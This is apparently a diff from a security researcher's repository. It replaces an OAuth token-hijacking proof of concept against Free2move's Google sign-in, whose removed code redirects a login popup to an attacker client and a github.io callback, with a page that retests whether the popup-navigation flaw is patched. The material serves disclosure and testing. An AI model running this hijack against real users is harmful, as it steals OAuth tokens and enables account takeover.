@@ -1,58 +1,110 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>SSO Hijack URL</title>
-  <script>
-  (function(){
-    // Read the target from ?target=
-    const target = new URLSearchParams(location.search).get('target');
-    if (!target) return alert('Missing ?target parameter.');
-
-    // Listen for the token from the child
-    window.addEventListener('message', e => {
-      if (e.origin !== location.origin) return;
-      if (e.data.type === 'got_token') {
-        alert('🥷 Stolen token:\n' + e.data.token);
-      }
-    });
-
-    // 1) Open Free2move’s login
-    const popup = window.open(
-      target,
-      'sso_window',
-      'width=600,height=800'
-    );
-
-    // 2) Build the attacker OAuth URL
-    const ATTACKER_CLIENT_ID = '';
-    const REDIRECT_URI       = 'https://eunoiia.github.io/sso-poc/callback.html';
-    const authUrl = 
-      'https://accounts.google.com/o/oauth2/v2/auth' +
-      '?client_id='    + encodeURIComponent(ATTACKER_CLIENT_ID) +
-      '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +
-      '&response_type=token' +
-      '&scope=email%20profile' +
-      '&prompt=select_account'
-    ;
-
-    // 3) Poll for Google’s frames (≥2)
-    const tid = setInterval(() => {
-      let frames = 0;
-      try { frames = popup.frames.length; }
-      catch(_) { /* cross-origin until they appear */ }
-
-      if (frames >= 2) {
-        clearInterval(tid);
-        // hijack the OAuth handshake
-        popup.location.replace(authUrl);
-      }
-    }, 300);
-  })();
-  </script>
+  <meta charset="utf-8"/>
+  <title>SSO Parent→Child Navigation Test</title>
+  <style>
+    body {font-family:system-ui, Arial; padding:20px; max-width:900px}
+    button {padding:10px 14px; margin:6px}
+    #log {white-space:pre-wrap; background:#f7f7f7; border:1px solid #ddd; padding:12px; margin-top:12px; height:240px; overflow:auto}
+    .ok {color:green} .fail {color:crimson}
+  </style>
 </head>
 <body>
-  <h1>Launching SSO…</h1>
-  <p>If you see a popup, click “Sign in with Google” to proceed.</p>
+  <h2>SSO Parent→Child Navigation Test</h2>
+  <p>
+    This page will open your staging login page in a popup and — after a short wait — attempt to
+    redirect that popup to an attacker-controlled URL using <code>popup.location.replace()</code>.
+    If the navigation succeeds you'll be able to read the popup URL (same-origin). If not, the
+    navigation was blocked / ineffective (expected for a correct patch).
+  </p>
+
+  <label>
+    Staging login URL:
+    <input id="staging" style="width:70%" value="https://free2move.com/en-GB/login" />
+  </label>
+  <br/>
+  <label>
+    Attacker (this) origin URL (what we try to force the popup to):
+    <input id="attacker" style="width:70%" value="http://localhost:8080/callback.html" />
+  </label>
+  <br/>
+  <button id="run">Run test (open popup & attempt hijack)</button>
+  <button id="openAttackerPage">Open attacker landing (manual)</button>
+  <div id="log"></div>
+
+  <script>
+    const L = msg => {
+      const log = document.getElementById('log');
+      log.textContent += msg + "\n";
+      log.scrollTop = log.scrollHeight;
+      console.log(msg);
+    };
+
+    document.getElementById('openAttackerPage').onclick = () => {
+      // you can optionally host a simple attacker landing page at the attacker URL
+      window.open(document.getElementById('attacker').value, '_blank');
+    };
+
+    document.getElementById('run').onclick = async () => {
+      const stagingURL = document.getElementById('staging').value.trim();
+      const attackerURL = document.getElementById('attacker').value.trim();
+
+      L("=== Starting Parent→Child navigation test ===");
+      L("Staging login: " + stagingURL);
+      L("Attacker target: " + attackerURL);
+      L("Opening popup to staging login... (allow popups if blocked)");
+
+      // Open the staging login page in a new window (popup)
+      const popup = window.open(stagingURL, '_blank');
+
+      if (!popup) {
+        L("❗ Popup blocked. Enable popups for this site and retry.");
+        return;
+      }
+
+      L("Popup opened. Waiting 4s for page to start loading...");
+      await new Promise(r => setTimeout(r, 4000));
+
+      // Attempt to change popup location to attacker URL
+      L("Attempting popup.location.replace(attackerURL) ...");
+      try {
+        popup.location.replace(attackerURL);
+        L("Called popup.location.replace(...) without immediate exception.");
+      } catch (e) {
+        L("Exception when trying to replace location (EXPECTED if patched): " + e);
+      }
+
+      // Give time for navigation to happen (or be blocked)
+      L("Waiting 3s for navigation to complete...");
+      await new Promise(r => setTimeout(r, 3000));
+
+      // Now try to read popup.current location (only possible if popup is same-origin)
+      try {
+        const current = popup.location.href; // will throw if still cross-origin
+        L("✅ Able to read popup.location.href: " + current);
+        if (current.startsWith(attackerURL)) {
+          L("%cRESULT: Vulnerable — popup navigated to attacker URL", "color:green");
+          L("The parent successfully forced navigation to attacker -> patch FAILED.");
+        } else {
+          L("Result: popup is same-origin but not at attacker URL: " + current);
+          L("Investigate why popup didn't go to the attacker URL (maybe provider intervened).");
+        }
+      } catch (e) {
+        L("🔒 Could not read popup.location.href (likely still cross-origin).");
+        L("This is the EXPECTED behavior for a patched flow: parent cannot force or confirm navigation to an attacker URL.");
+        L("If the popup actually did navigate to attacker behind-the-scenes you'd usually be able to read it because attacker URL is same-origin to this page — so failure to read is a good sign.");
+      }
+
+      // Extra check: if the popup is closed quickly, the attacker navigation may have succeeded and then closed
+      try {
+        L("Popup.closed = " + popup.closed);
+      } catch (_) {
+        L("Cannot read popup.closed (cross-origin) — normal.");
+      }
+
+      L("=== Test complete. ===");
+    };
+  </script>
 </body>
 </html>
